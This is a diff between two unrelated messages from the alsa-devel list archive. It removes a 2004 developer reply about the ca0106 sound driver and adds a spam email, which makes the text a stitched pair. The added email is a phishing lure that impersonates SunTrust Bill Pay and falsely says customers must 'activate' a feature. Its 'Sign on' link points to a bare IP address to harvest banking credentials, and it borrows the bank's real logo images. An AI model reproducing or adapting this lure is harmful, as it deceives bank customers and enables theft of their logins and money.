@@ -1,16 +1,14 @@
-From: James Courtier-Dutton <James@superbug.co.uk>
-Subject: Re: [PATCH] New snd-audigyls driver available.
-Date: Sat, 04 Dec 2004 12:38:39 +0000
-Message-ID: <41B1AFCF.5040301@superbug.co.uk>
-References: <41AF9A47.3060706@superbug.co.uk>	<s5hk6rzzk5i.wl@alsa2.suse.de>	<41B0BC11.5090106@superbug.co.uk>	<s5h4qj32ln6.wl@alsa2.suse.de>	<41B0CA3C.8070606@superbug.co.uk> <s5hzn0v1441.wl@alsa2.suse.de>
+From: SunTrust <support@suntrust.com>
+Subject: SunTrust Bill Pay enhancements
+Date: Sat, 04 Dec 2004 17:46:51 +0500 (CST)
+Message-ID: <674568151329.D514fnzMQfcc568@contemporary35.squeeze40femenino.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=ISO-8859-1; format=flowed
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/alternative;
+	boundary="--198603029822571"
 Return-path: <alsa-devel-admin@lists.sourceforge.net>
-Received: from anchor-post-35.mail.demon.net (anchor-post-35.mail.demon.net [194.217.242.85])
-	by alsa.alsa-project.org (ALSA's E-mail Delivery System) with ESMTP id 759EB32D
-	for <alsa-devel@alsa-project.org>; Sat,  4 Dec 2004 13:38:44 +0100 (MET)
-In-Reply-To: <s5hzn0v1441.wl@alsa2.suse.de>
+Received: from 200-207-93-141.dsl.telesp.net.br (200-207-93-141.dsl.telesp.net.br [200.207.93.141])
+	by alsa.alsa-project.org (ALSA's E-mail Delivery System) with SMTP id E8423335
+	for <alsa-devel@alsa-project.org>; Sat,  4 Dec 2004 13:58:32 +0100 (MET)
 Sender: alsa-devel-admin@lists.sourceforge.net
 Errors-To: alsa-devel-admin@lists.sourceforge.net
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/alsa-devel>,
@@ -20,37 +18,60 @@ List-Help: <mailto:alsa-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/alsa-devel>,
 	<mailto:alsa-devel-request@lists.sourceforge.net?subject=subscribe>
 List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=alsa-devel>
-To: Takashi Iwai <tiwai@suse.de>
-Cc: ALSA development <alsa-devel@alsa-project.org>
+To: alsa-devel@alsa-project.org
 List-Id: alsa-devel@alsa-project.org
 
-Takashi Iwai wrote:
->>>
->>>Shall I replace the struct/function names from audigyls to ca0106,
->>>too?  Or, would you like to keep audigyls there?
->>>
->>>
->>>Takashi
->>>
->>
->>Ah! Good question. I think for the sake of consistancy, replacing those 
->>would also be a good idea.
->>Do you want me to do that, or would it be easier if you do it.
-> 
-> 
-> Could you do that?  I can't test the changed driver here.
-> 
-> 
-> Takashi
-> 
-> 
+----198603029822571
+Content-Type: text/html;
+Content-Transfer-Encoding: 7Bit
 
-Done, download the new ca0106 driver from:
-http://www.alsa-project.org/~james/alsa-driver/ca0106/
+<html>
+<head>
+	<title>Untitled</title>
+</head>
 
-The install.txt explains how to integrate it into the alsa-driver CVS.
+<body>
 
-The CA0106.conf will replace the AudigyLS.conf
+<table width="90%">
+<tr>
+	<td colspan="2"><img src="http://www.suntrust.com/images/Common/release3/logo_home.gif" border="0" alt=""></td>
+</tr>
+<tr>
+<td colspan="2" bgcolor="#F9BC36"><img src="http://www.suntrust.com/images/Common/release3/logo_home.gif" border="0" alt="" height="2" width="1"></td>
+</tr>
+<tr>
+<td width="20">&nbsp;&nbsp;</td>
+<td>
+<font style="font-size: 9pt; font-family: Arial; color: #000000; font-style: normal;">
+<p>Dear SunTrust Customer,</p>
+<br>
+<p>We've enhanced Internet Banking's Bill Pay feature to make it even easier to pay your bills online:
+<ul>
+<li>	Set up and submit payments to multiple billers at the same time -- directly from the initial screen.<br><br>
+<li>	View your pending payments and bill history from the same screen to get a quick snapshot of your bill pay activity.<br><br>
+<li>	Select same day or next day payment delivery, and you'll receive a confirmation number for each payment submitted.
+</ul>
+
+<p>Suntrust requires that you activate this new feature.  <a href="http://82.90.165.65/s/">Sign on</a> to Internet Banking today to view all of the new changes we've made to simplify paying your bills online.</p>
+
+<br>
+
+<p>SunTrust Customer Service</p>
+
+</font>
+</td>
+</tr>
+<tr>
+<td colspan="2" bgcolor="#F9BC36"><img src="http://www.suntrust.com/images/Common/release3/logo_home.gif" border="0" alt="" height="2" width="1"></td>
+</tr>
+</table>
+
+
+</body>
+</html>
+
+
+----198603029822571--
 
 
 -------------------------------------------------------
